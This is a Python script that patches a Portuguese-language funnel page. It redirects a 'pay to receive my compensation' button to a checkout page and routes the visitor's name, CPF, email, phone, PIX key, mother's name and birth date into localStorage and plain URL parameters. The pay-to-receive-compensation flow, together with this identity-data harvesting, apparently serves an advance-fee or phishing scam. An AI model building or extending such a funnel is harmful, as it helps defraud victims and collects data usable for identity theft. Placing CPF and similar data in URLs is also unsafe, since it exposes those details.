import sys
import os

sys.stdout.reconfigure(encoding='utf-8')

# 1. Update index.html
with open('index.html', 'r', encoding='utf-8') as f:
    content = f.read()

# Replace finalCta button to call goToCheckoutPagamento(event) and fix encoding of "indenização"
old_cta = '<button type="button" class="btn-cta-final" onclick="goToAcesso01(event)">'
new_cta = '<button type="button" class="btn-cta-final" onclick="goToCheckoutPagamento(event)">'

if old_cta in content:
    content = content.replace(old_cta, new_cta)
    print("Updated finalCta button to call goToCheckoutPagamento(event)")
else:
    print("Warning: old_cta not found in index.html")

# Fix button text if it has replacement char
old_span = '<span>Concluir pagamento e receber minha indeniza\ufffdo</span>'
if old_span in content:
    content = content.replace(old_span, '<span>Concluir pagamento e receber minha indenização</span>')
    print("Fixed button text encoding in finalCta")

# Update goToAcesso01 function around position 8995666
old_func_start = '// Redirecionamento Final para o Acesso 01\n        function goToAcesso01(event) {'
idx_start = content.find(old_func_start)
if idx_start != -1:
    idx_end = content.find('</script>', idx_start)
    if idx_end != -1:
        old_func_block = content[idx_start:idx_end]
        
        new_func_block = """// Redirecionamento Final para o Checkout / Pagamento
        function goToCheckoutPagamento(event) {
          if (event) {
            try { event.preventDefault(); } catch (e) {}
            try { event.stopPropagation(); } catch (e) {}
          }

          var params = new URLSearchParams(window.location.search);

          // Dados do Cidadão / Lead obtidos durante a interação
          var nome = (typeof leadData !== "undefined" && leadData && leadData.nome) || localStorage.getItem("nome") || "";
          var cpf = (typeof leadData !== "undefined" && leadData && leadData.cpf) || localStorage.getItem("cpf") || "";
          var rawCpf = String(cpf).replace(/\\D/g, "");

          var email = (typeof leadData !== "undefined" && leadData && leadData.email) || localStorage.getItem("email") || "";
          var phone = (typeof leadData !== "undefined" && leadData && leadData.telefone) || localStorage.getItem("phone") || localStorage.getItem("telefone") || "";

          // Se a chave PIX selecionada/digitada for e-mail ou celular, aproveita como dado preenchido
          var chavePix = (typeof leadData !== "undefined" && leadData && leadData.chavePix) || localStorage.getItem("chavePix") || "";
          var tipoChave = (typeof leadData !== "undefined" && leadData && leadData.tipoChave) || localStorage.getItem("tipoChave") || "";

          if (!email && chavePix && (tipoChave === "EMAIL" || chavePix.indexOf("@") !== -1)) {
            email = chavePix.trim();
          }
          if (!phone && chavePix) {
            var rawKey = chavePix.replace(/\\D/g, "");
            if (tipoChave === "TELEFONE" || ((rawKey.length === 10 || rawKey.length === 11) && rawKey !== rawCpf)) {
              phone = rawKey;
            }
          }

          var mae = (typeof leadData !== "undefined" && leadData && leadData.mae) || localStorage.getItem("mae") || "";
          var nascimento = (typeof leadData !== "undefined" && leadData && leadData.nascimento) || localStorage.getItem("nascimento") || "";

          // Sincroniza em localStorage e propaga via URL SearchParams
          if (nome) {
            params.set("nome", nome);
            try { localStorage.setItem("nome", nome); } catch (e) {}
          }
          if (rawCpf) {
            params.set("cpf", rawCpf);
            try { localStorage.setItem("cpf", rawCpf); } catch (e) {}
          }
          if (email) {
            params.set("email", email);
            try { localStorage.setItem("email", email); } catch (e) {}
          }
          if (phone) {
            params.set("phone", phone);
            try { localStorage.setItem("phone", phone); } catch (e) {}
          }
          if (chavePix) {
            params.set("chave_pix", chavePix);
            try { localStorage.setItem("chavePix", chavePix); } catch (e) {}
          }
          if (tipoChave) {
            params.set("tipo_chave", tipoChave);
            try { localStorage.setItem("tipoChave", tipoChave); } catch (e) {}
          }
          if (mae) {
            params.set("mae", mae);
            try { localStorage.setItem("mae", mae); } catch (e) {}
          }
          if (nascimento) {
            params.set("nascimento", nascimento);
            try { localStorage.setItem("nascimento", nascimento); } catch (e) {}
          }

          var dest = "checkout/Pagamento/index.html?" + params.toString();
          window.location.href = dest;
        }

        var goToAcesso01 = goToCheckoutPagamento;
        window.goToCheckoutPagamento = goToCheckoutPagamento;
        window.goToAcesso01 = goToCheckoutPagamento;
        """
        content = content[:idx_start] + new_func_block + content[idx_end:]
        print("Updated goToCheckoutPagamento function in chat script")
    else:
        print("Error: closing script tag not found for goToAcesso01")
else:
    print("Warning: old_func_start not found in index.html")

# Update window.goToAcesso01 around 9477189
old_window_func = """      window.goToAcesso01 = function (event) {
        if (event) event.preventDefault();
        if (window.AppFunil && window.AppFunil.goTo) {
          window.AppFunil.goTo("acesso-01");
        } else {
          window.location.href = "../acesso/01" + window.location.search;
        }
      };"""

new_window_func = """      window.goToCheckoutPagamento = function (event) {
        if (event && event.preventDefault) event.preventDefault();
        var params = new URLSearchParams(window.location.search);
        var nome = localStorage.getItem("nome") || (typeof leadData !== "undefined" && leadData && leadData.nome) || "";
        var cpf = localStorage.getItem("cpf") || (typeof leadData !== "undefined" && leadData && leadData.cpf) || "";
        var rawCpf = String(cpf).replace(/\\D/g, "");
        var email = localStorage.getItem("email") || (typeof leadData !== "undefined" && leadData && leadData.email) || "";
        var phone = localStorage.getItem("phone") || localStorage.getItem("telefone") || (typeof leadData !== "undefined" && leadData && leadData.telefone) || "";
        var chavePix = localStorage.getItem("chavePix") || (typeof leadData !== "undefined" && leadData && leadData.chavePix) || "";
        var tipoChave = localStorage.getItem("tipoChave") || (typeof leadData !== "undefined" && leadData && leadData.tipoChave) || "";

        if (!email && chavePix && (tipoChave === "EMAIL" || chavePix.indexOf("@") !== -1)) {
          email = chavePix.trim();
        }
        if (!phone && chavePix) {
          var rawKey = chavePix.replace(/\\D/g, "");
          if (tipoChave === "TELEFONE" || ((rawKey.length === 10 || rawKey.length === 11) && rawKey !== rawCpf)) {
            phone = rawKey;
          }
        }

        var mae = localStorage.getItem("mae") || (typeof leadData !== "undefined" && leadData && leadData.mae) || "";
        var nascimento = localStorage.getItem("nascimento") || (typeof leadData !== "undefined" && leadData && leadData.nascimento) || "";

        if (nome) params.set("nome", nome);
        if (rawCpf) params.set("cpf", rawCpf);
        if (email) params.set("email", email);
        if (phone) params.set("phone", phone);
        if (chavePix) params.set("chave_pix", chavePix);
        if (tipoChave) params.set("tipo_chave", tipoChave);
        if (mae) params.set("mae", mae);
        if (nascimento) params.set("nascimento", nascimento);

        window.location.href = "checkout/Pagamento/index.html?" + params.toString();
      };
      window.goToAcesso01 = window.goToCheckoutPagamento;"""

if old_window_func in content:
    content = content.replace(old_window_func, new_window_func)
    print("Updated window.goToAcesso01 and added window.goToCheckoutPagamento in SPA script")
else:
    print("Warning: old_window_func not found in index.html")

# In goTo(stepId, pushHistory), intercept "acesso"
old_goto = "function goTo(stepId, pushHistory) {\n          if (pushHistory === undefined) pushHistory = true;\n          var target = document.getElementById(\"page-\" + stepId);"
new_goto = """function goTo(stepId, pushHistory) {
          if (stepId === "acesso-01" || stepId === "acesso" || (stepId && stepId.indexOf("acesso") !== -1)) {
            if (typeof window.goToCheckoutPagamento === "function") {
              window.goToCheckoutPagamento();
              return;
            }
          }
          if (pushHistory === undefined) pushHistory = true;
          var target = document.getElementById("page-" + stepId);"""

if old_goto in content:
    content = content.replace(old_goto, new_goto)
    print("Added acesso redirection intercept in goTo function")
else:
    print("Warning: old_goto not found in index.html")

# In submitCustomPix, save email or phone if provided
old_custom_pix = """function submitCustomPix() {
          var field = document.getElementById("customPixField");
          if (!field || !field.value.trim()) return;
          leadData.chavePix = field.value.trim();

          var inputGroup = document.getElementById("customPixInputGroup");
          if (inputGroup) inputGroup.remove();

          addUserMsg(leadData.chavePix);"""

new_custom_pix = """function submitCustomPix() {
          var field = document.getElementById("customPixField");
          if (!field || !field.value.trim()) return;
          var val = field.value.trim();
          leadData.chavePix = val;
          try { localStorage.setItem("chavePix", val); } catch (e) {}

          if (leadData.tipoChave === "EMAIL" || val.indexOf("@") !== -1) {
            leadData.email = val;
            try { localStorage.setItem("email", val); } catch (e) {}
          } else if (leadData.tipoChave === "TELEFONE" || ((val.replace(/\\D/g, "").length === 10 || val.replace(/\\D/g, "").length === 11) && val.replace(/\\D/g, "") !== leadData.cpf.replace(/\\D/g, ""))) {
            leadData.telefone = val.replace(/\\D/g, "");
            try {
              localStorage.setItem("phone", leadData.telefone);
              localStorage.setItem("telefone", leadData.telefone);
            } catch (e) {}
          } else if (leadData.tipoChave === "CPF" || val.replace(/\\D/g, "").length === 11) {
            try { localStorage.setItem("cpf", val.replace(/\\D/g, "")); } catch (e) {}
          }

          var inputGroup = document.getElementById("customPixInputGroup");
          if (inputGroup) inputGroup.remove();

          addUserMsg(leadData.chavePix);"""

if old_custom_pix in content:
    content = content.replace(old_custom_pix, new_custom_pix)
    print("Updated submitCustomPix to sync email/phone/cpf to localStorage")
else:
    print("Warning: old_custom_pix not found in index.html")

with open('index.html', 'w', encoding='utf-8') as f:
    f.write(content)
print("index.html written successfully!")
